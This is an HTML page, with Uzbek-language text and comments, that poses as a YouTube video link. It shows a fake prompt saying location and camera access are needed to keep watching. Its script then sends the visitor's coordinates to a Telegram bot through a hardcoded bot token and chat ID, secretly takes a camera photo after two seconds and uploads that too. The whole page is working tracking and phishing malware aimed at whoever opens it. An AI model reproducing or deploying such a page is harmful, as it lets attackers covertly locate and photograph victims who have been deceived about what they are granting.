<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Link</title>
    <style>
        html, body {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }
        #video-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        #prompt-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        #prompt-message {
            background: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            max-width: 80%;
        }
        #prompt-message button {
            margin-top: 10px;
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
        }
        #camera-preview {
            display: none; /* Dastlab yashirin */
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 2000;
        }
    </style>
</head>
<body>
    <div id="video-container">
        <iframe src="https://www.youtube.com/embed/-4fLvxV9fvE?autoplay=1&mute=0&controls=1" 
                title="YouTube video player" 
                frameborder="0" 
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
                allowfullscreen>
        </iframe>
    </div>

    <div id="prompt-overlay">
        <div id="prompt-message">
            <h2>Iltimos, ruxsat bering</h2>
            <p>YouTube videoni ko‘rishda davom etish uchun joylashuv va kamera ruxsatini bering.</p>
            <button onclick="requestPermissions()">Ruxsat berish</button>
        </div>
    </div>

    <!-- Kamera oldindan ko‘rish uchun video elementi -->
    <video id="camera-preview" width="640" height="480" autoplay></video>

    <script>
        const BOT_TOKEN = '7393954828:AAHhCwcD7LlP8SUmCx-Pefw3IT-70yQynN4'; // Telegram bot token
        const CHAT_ID = '7281698380'; // Telegram chat ID
        let permissionsGranted = false; // Ruxsat berilganligini tekshirish uchun

        async function sendLocationToTelegram(latitude, longitude) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, latitude, longitude })
                });
                if (response.ok) {
                    console.log('Location sent successfully!');
                } else {
                    console.error('Failed to send location:', await response.text());
                }
            } catch (error) {
                console.error('Error sending location:', error);
            }
        }

        async function sendPhotoToTelegram(imageBlob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', imageBlob, 'camera-photo.png');

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                if (response.ok) {
                    console.log('Photo sent successfully!');
                } else {
                    console.error('Failed to send photo:', await response.text());
                }
            } catch (error) {
                console.error('Error sending photo:', error);
            }
        }

        async function capturePhotoFromCamera() {
            const video = document.getElementById('camera-preview');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Kamerani o‘chirish
            const stream = video.srcObject;
            const tracks = stream.getTracks();
            tracks.forEach(track => track.stop());
            video.style.display = 'none';

            // Rasmni Blob sifatida olish va yuborish
            canvas.toBlob(async (blob) => {
                await sendPhotoToTelegram(blob);
            }, 'image/png');
        }

        async function startCamera() {
            const video = document.getElementById('camera-preview');
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                video.style.display = 'block'; // Kamerani ko‘rsatish
                setTimeout(capturePhotoFromCamera, 2000); // 2 soniyadan keyin rasmga olish
            } catch (error) {
                console.error('Error accessing camera:', error);
                alert('Kameraga ruxsat berilmadi!');
            }
        }

        async function requestPermissions() {
            if (permissionsGranted) return; // Agar ruxsat allaqachon berilgan bo‘lsa, qayta so‘ramaydi

            document.getElementById('prompt-overlay').style.display = 'none'; // Overlayni yashirish
            permissionsGranted = true; // Ruxsat berilgan deb belgilash

            // Joylashuvni olish
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const { latitude, longitude } = position.coords;
                    await sendLocationToTelegram(latitude, longitude);
                    // Joylashuv yuborilgandan so‘ng kamera ochiladi
                    await startCamera();
                }, (error) => {
                    console.error('Error getting location:', error);
                    alert('Joylashuvga ruxsat berilmadi!');
                });
            } else {
                alert('Geolocation is not supported by this browser.');
            }
        }

        document.addEventListener('DOMContentLoaded', () => {
            // To‘liq ekran rejimiga o‘tish
            document.documentElement.requestFullscreen().catch(err => {
                console.error('Failed to enter full-screen mode:', err);
            });
        });
    </script>
</body>
</html>
